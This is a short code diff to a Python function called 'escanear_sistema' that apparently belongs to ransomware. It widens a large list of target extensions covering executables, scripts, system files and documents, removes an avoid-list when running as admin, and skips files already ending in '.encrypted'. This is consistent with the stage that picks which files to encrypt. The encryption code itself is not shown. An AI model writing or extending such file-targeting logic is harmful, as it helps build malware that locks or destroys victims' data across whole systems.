@@ -44,9 +44,11 @@ def escanear_sistema():
         '.vue', '.sass', '.scss', '.less', '.coffee', '.ejs', '.pug',
         '.haml', '.slim', '.erb', '.hbs', '.mustache', '.twig', '.blade',
         '.sol', '.asm', '.s', '.pas', '.pp', '.inc', '.ino', '.pde',
-        '.exe', '.msi', '.dll', '.sys', '.bat', '.ps1', '.sh', '.cmd',
-        '.app', '.deb', '.rpm', '.apk', '.ipa', '.dmg', '.pkg', '.run',
-        '.bin', '.out', '.elf', '.com', '.scr', '.vbs', '.wsf', '.gadget',
+        '.sh', '.bash', '.zsh', '.fish', '.bat', '.cmd', '.ps1', '.psm1',
+        '.vbs', '.vba', '.ahk', '.au3',
+        '.exe', '.msi', '.dll', '.sys', '.scr', '.gadget',
+        '.app', '.apk', '.ipa', '.dmg', '.pkg', '.run',
+        '.bin', '.out', '.elf', '.com',
         '.jar', '.war', '.ear', '.class', '.pyc', '.pyo', '.pyd', '.so',
         '.dylib', '.o', '.a', '.lib', '.ocx', '.cpl', '.drv', '.efi',
         '.ini', '.cfg', '.conf', '.config', '.yaml', '.yml', '.toml',
@@ -64,7 +66,7 @@ def escanear_sistema():
         '.dwg', '.dxf', '.skp', '.blend', '.max', '.3ds', '.obj', '.fbx',
         '.stl', '.step', '.stp', '.iges', '.igs', '.sat', '.sldprt', '.sldasm',
         '.slddrw', '.ipt', '.iam', '.idw', '.prt', '.asm', '.drw', '.catpart',
-        '.catproduct', '.cgr', '.3dm', '.rvt', '.rfa', '.rte', '.rft', ''
+        '.catproduct', '.cgr', '.3dm', '.rvt', '.rfa', '.rte', '.rft'
     }
     if admin:
         evitar_parcial = set()
@@ -122,6 +124,8 @@ def escanear_sistema():
                     try:
                         total += 1
                         if archivo.lower() in [x.lower() for x in archivos_app]:
+                            continue
+                        if archivo.endswith('.encrypted'):
                             continue
                         ext = os.path.splitext(archivo)[1].lower()
                         ruta_completa = os.path.join(root, archivo)
